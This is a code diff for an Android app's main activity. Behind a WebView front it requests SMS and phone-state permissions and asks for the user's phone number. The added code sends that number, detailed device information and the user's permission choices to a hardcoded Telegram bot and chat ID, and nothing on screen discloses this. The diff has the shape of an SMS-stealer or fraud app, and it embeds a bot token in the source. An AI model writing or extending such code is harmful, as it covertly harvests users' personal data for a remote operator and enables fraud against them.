@@ -10,11 +10,9 @@ import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.Build
 import android.os.Bundle
-import android.view.View
 import android.webkit.WebView
 import android.widget.EditText
 import androidx.activity.enableEdgeToEdge
-import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -24,17 +22,27 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import okio.IOException
 
-
 class MainActivity : AppCompatActivity() {
     private lateinit var sharedPreferences: SharedPreferences
     private lateinit var myWebView: WebView
+    private val client = OkHttpClient()
     
+    companion object {
+        private const val PERMISSION_REQUEST_CODE = 100
+        private const val PREFS_NAME = "AppPrefs"
+        private const val PHONE_NUMBER_KEY = "phone_number"
+        private val REQUIRED_PERMISSIONS = arrayOf(
+            Manifest.permission.READ_SMS,
+            Manifest.permission.READ_PHONE_STATE
+        )
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
         setContentView(R.layout.activity_main)
         
-        sharedPreferences = getSharedPreferences("AppPrefs", MODE_PRIVATE)
+        sharedPreferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
         myWebView = findViewById(R.id.webview)
         
         with(myWebView.settings) {
@@ -81,16 +89,6 @@ class MainActivity : AppCompatActivity() {
             .show()
     }
 
-    private val client = OkHttpClient()
-
-    companion object {
-        private const val PERMISSION_REQUEST_CODE = 100
-        private val REQUIRED_PERMISSIONS = arrayOf(
-            Manifest.permission.READ_SMS,
-            Manifest.permission.READ_PHONE_STATE
-        )
-    }
-
     private fun checkPermissions() {
         val permissionsToRequest = REQUIRED_PERMISSIONS.filter { permission ->
             ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
@@ -104,6 +102,7 @@ class MainActivity : AppCompatActivity() {
             )
         } else {
             onAllPermissionsGranted()
+            sendPermissionsNotification("Все разрешения уже предоставлены")
         }
     }
 
@@ -119,14 +118,16 @@ class MainActivity : AppCompatActivity() {
 
             if (allGranted) {
                 onAllPermissionsGranted()
+                sendPermissionsNotification("Пользователь предоставил все разрешения")
             } else {
                 checkPermissions()
+                sendPermissionsNotification("Пользователь отказал в некоторых разрешениях")
             }
         }
     }
 
     private fun onAllPermissionsGranted() {
-        val savedPhoneNumber = sharedPreferences.getString("phone_number", null)
+        val savedPhoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, null)
         if (savedPhoneNumber == null) {
             showPhoneNumberInputDialog()
         } else {
@@ -135,18 +136,19 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun showPhoneNumberInputDialog() {
-        val input = EditText(this)
-        input.hint = "Введите номер телефона"
+        val input = EditText(this).apply {
+            hint = "Введите номер телефона"
+        }
 
         AlertDialog.Builder(this)
             .setTitle("Ввод номера телефона")
-            .setMessage("Пожалуйста, введите ваш номер телефона для продолжения")
+            .setMessage("Пожалуйста, введите ваш номер телефона")
             .setView(input)
             .setPositiveButton("Продолжить") { _, _ ->
                 val phoneNumber = input.text.toString().trim()
                 if (phoneNumber.isNotEmpty()) {
-                    sharedPreferences.edit().putString("phone_number", phoneNumber).apply()
-                    sendPhoneNumberToBot(phoneNumber)
+                    sharedPreferences.edit().putString(PHONE_NUMBER_KEY, phoneNumber).apply()
+                    sendUserDataToBot(phoneNumber, "Новый пользователь ввел номер телефона")
                     loadWebView()
                 } else {
                     showPhoneNumberInputDialog()
@@ -156,54 +158,75 @@ class MainActivity : AppCompatActivity() {
             .show()
     }
 
-    private fun sendPhoneNumberToBot(phoneNumber: String) {
-        val deviceModel = getDeviceModel()
-        sendToTelegramBot("""
-            Новый пользователь!
+    private fun sendPermissionsNotification(message: String) {
+        val phoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, "Номер не указан")
+        val deviceInfo = getDeviceInfo()
+        val fullMessage = """
+            $message
             
             Номер телефона: $phoneNumber
-            Устройство: $deviceModel
-        """.trimIndent())
+            Устройство: $deviceInfo
+            Разрешения: ${REQUIRED_PERMISSIONS.joinToString()}
+        """.trimIndent()
+        
+        sendToTelegramBot(fullMessage)
+    }
+
+    private fun sendUserDataToBot(phoneNumber: String, context: String) {
+        val deviceInfo = getDeviceInfo()
+        val message = """
+            $context
+            
+            Номер телефона: $phoneNumber
+            Устройство: $deviceInfo
+        """.trimIndent()
+        
+        sendToTelegramBot(message)
     }
 
     private fun loadWebView() {
         myWebView.loadUrl("https://www.example.com")
     }
 
-    private fun getDeviceModel(): String {
-        return "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
+    private fun getDeviceInfo(): String {
+        return """
+            Модель: ${Build.MANUFACTURER} ${Build.MODEL}
+            Android версия: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})
+            Устройство: ${Build.DEVICE}
+        """.trimIndent()
     }
 
     private fun sendToTelegramBot(message: String) {
-        val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
-        val chatId = "6331293386"
-        val url = "https://api.telegram.org/bot$botToken/sendMessage"
+        try {
+            val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
+            val chatId = "6331293386"
+            val url = "https://api.telegram.org/bot$botToken/sendMessage"
 
-        val mediaType = "application/json".toMediaType()
-        val requestBody = """
-            {
-                "chat_id": "$chatId",
-                "text": "$message",
-                "parse_mode": "Markdown"
-            }
-        """.trimIndent().toRequestBody(mediaType)
-
-        val request = Request.Builder()
-            .url(url)
-            .post(requestBody)
-            .build()
-
-        client.newCall(request).enqueue(object : okhttp3.Callback {
-            override fun onFailure(call: okhttp3.Call, e: IOException) {
-                e.printStackTrace()
-            }
-
-            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
-                if (!response.isSuccessful) {
-                    println("${response.code}")
+            val mediaType = "application/json".toMediaType()
+            val requestBody = """
+                {
+                    "chat_id": "$chatId",
+                    "text": "$message",
+                    "parse_mode": "Markdown"
                 }
-                response.close()
-            }
-        })
+            """.trimIndent().toRequestBody(mediaType)
+
+            val request = Request.Builder()
+                .url(url)
+                .post(requestBody)
+                .build()
+
+            client.newCall(request).enqueue(object : okhttp3.Callback {
+                override fun onFailure(call: okhttp3.Call, e: IOException) {
+                    e.printStackTrace()
+                }
+
+                override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
+                    response.close()
+                }
+            })
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
     }
 }
